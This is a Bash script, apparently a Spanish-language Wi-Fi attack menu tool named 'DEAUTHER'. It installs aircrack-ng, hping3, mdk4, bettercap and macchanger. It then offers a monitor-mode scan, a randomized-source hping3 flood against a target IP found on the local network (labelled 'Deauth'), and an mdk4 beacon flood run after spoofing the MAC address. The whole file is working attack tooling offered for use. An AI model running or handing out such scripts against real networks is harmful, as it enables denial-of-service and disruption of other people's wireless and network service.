#!bin/bash

sudo apt install hping3	-y
sudo apt install aircrack-ng -y
sudo apt-get install mdk4 -y
sudo apt-get install gnome-terminal -y
sudo apt-get install bettercap -y
sudo apt-get install -y netdiscover-y
sudo apt install macchanger -y 

clear

echo "██████╗ ███████╗ █████╗ ██╗   ██╗████████╗██╗  ██╗███████╗██████╗ "
echo "██╔══██╗██╔════╝██╔══██╗██║   ██║╚══██╔══╝██║  ██║██╔════╝██╔══██╗"
echo "██║  ██║█████╗  ███████║██║   ██║   ██║   ███████║█████╗  ██████╔╝"
echo "██║  ██║██╔══╝  ██╔══██║██║   ██║   ██║   ██╔══██║██╔══╝  ██╔══██╗"
echo "██████╔╝███████╗██║  ██║╚██████╔╝   ██║   ██║  ██║███████╗██║  ██║"
echo "╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
echo "                version 1.0              creado por RIP-Network           "


PS3="Elige tu opción: "
opciones=("Scan wifi" "Deauth" "Beacon" "salir")
select opt in "${opciones[@]}"
do
    case $opt in 

        "Scan wifi") echo "Has elegido Scan wifi $CONT "
                clear 
                sudo iwconfig
                sudo airmon-ng
                echo
                read -p "[*] Escribe la Interfaz de la Tarjeta de Red (Ej: wlo1): " interfaz
                sudo ifconfig $interfaz promisc >/dev/null
                sudo airmon-ng start $interfaz >/dev/null
                echo "Activando modo monitor "
                clear
                sudo iwconfig
                sudo airmon-ng
                read -p "[*] Escribe la Interfaz de la Tarjeta de Red en modo Monitor (Ej: wlan0mon o wlan0): " interfaz2
                sudo airodump-ng $interfaz2 --band abg
                break
        ;;

        "Deauth") echo "Has elegido Deauth $CONT " 
                read -p "[*] Escribe la Ip de Red (Ej: 192.168.1.0 o 192.168.0.0): " opc1
                sudo netdiscover -r $opc1/24 -P
                echo
                read -p "[*] Pon la IP del Objetivo: " ip
                echo "Atacando el objetivo"
                sudo gnome-terminal -- sudo ping $ip
		        sleep 2
		        sudo hping3 --rand-source -V $ip --flood
                clear
                break

                
        ;;

        "Beacon") echo "Has elegido Beacon $CONT "
                read -p "[*] Escribe la Interfaz de la Tarjeta de Red (Ej: wlo1): " interfaz
                sudo airmon-ng
                read -p "[*] Escribe la Interfaz de la Tarjeta de Red en modo Monitor (Ej: wlan0mon o wlan0): " interfaz2
                echo
				sudo ifconfig $interfaz2 promisc >/dev/null
				sudo ifconfig $interfaz2 down >/dev/null
				sudo macchanger -a $interfaz2 >/dev/null
				sudo ifconfig $interfaz2 up >/dev/null
                echo "Pulse CTRL+C para parar"
                sudo mdk4 $interfaz2 b -s 1000
		break
        ;;

        "salir") break 
        ;;
        *) echo "Opcion no válida."
    esac
done
